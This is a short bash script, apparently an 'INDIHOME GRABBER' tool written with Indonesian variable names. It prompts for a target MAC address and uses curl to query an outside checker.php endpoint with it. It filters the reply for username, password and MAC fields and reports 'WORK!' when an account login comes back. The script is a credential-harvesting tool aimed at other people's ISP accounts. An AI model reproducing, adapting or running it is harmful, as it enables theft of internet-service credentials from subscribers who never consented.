#!/bin/bash

# Code Color
blue='\e[1;34m'
normal='\e[0;23m'
purple='\e[1;35m'
cyan='\e[1;36m'
red='\e[1;31m'
coklat='\e[0;33m'
ijo='\e[0;32m'
putih='\e[97m'
itam='\e[0;30m'
kuning='\e[1;33m'

# CONSTANT
LINE="--------------------------------------------"
SSID=`nmcli  | grep wlp3s0 | awk '{print $4 }'`
WHOAMI='whoami'
VERSI="v0.0.2"

CPUSensor=`inxi -s | grep Temperatures | awk '{print $6}'`
GPUSensor=`inxi -s | grep Temperatures | awk '{print $10}'`
MYIP1=`nmcli | grep servers | awk '{print $2}'`
MYIP2=`nmcli | grep servers | awk '{print $3}'`
#MYMAC=`nmcli | grep wifi | awk '{print $3}' | cut -f1 -d, | cut -f1 -do | cut -f1 -dt`
MYMAC=`cat /sys/class/net/$(ip route show default | awk '/default/ {print $5}')/address`
FINSTALL=`ls -lact --full-time /etc |tail | grep services | awk '{print $6 }'`
KERVER=`uname -r`
UPTIME1=$(uptime | awk '{print $1}' | cut -f1 -d,)
UPTIME2=$(uptime | awk '{print $3}' | cut -f1 -d,)

mdvk() {
    curl "http://apaini-as.cloud.revoluz.io/checker.php?target=${1}" | python -m json.tool |grep -E '"username"|"password"|"mac"' 
}

### START
clear

tampilkan(){
	sleep 0.1 && echo -e $putih	""
	sleep 0.1 && echo -e $putih	$LINE
	sleep 0.1 && echo -e $putih	" (◣_◢)	Պḓṽк $cyan💎	$putih$VERSI	|  $red INDIHOME GRABBER !"
	sleep 0.1 && echo -e $putih	$LINE
	#spinner"$!"
	sleep 0.1 && echo -e $putih	""
	sleep 0.1 && echo -e $red	" "
	sleep 0.5 && echo -e $putih	""
	sleep 0.1 && echo -e $putih	""

}
tampilkan
read -p  " Input Mac Target : " prompt 

# exec
#mdvk $prompt



if [[ $(mdvk $prompt) = *"@"* ]]; then
  	clear
  	echo -e $putih	""
	echo -e $putih	$LINE
	echo -e $putih	"(◣_◢)	Պḓṽк💎		| $VERSI "
	echo -e $putih	$LINE
	#spinner"$!"
	echo -e $putih	""
	echo -e $putih	"MAC ADDR 	: " $prompt
	echo -e $putih	"STATUS		: $ijo WORK!"
	echo -e $putih	
	echo -e $putih	$LINE

else
	clear
  	echo -e $putih	""
	echo -e $putih	$LINE
	echo -e $putih	"(◣_◢)	Պḓṽк💎		| $VERSI "
	echo -e $putih	$LINE
	#spinner"$!"
	echo -e $putih	""
	echo -e $putih	"MAC ADDR 	: " $prompt
	echo -e $putih	"STATUS		: $red NOTHING!"
	echo -e $putih	
	echo -e $putih	$LINE

fi


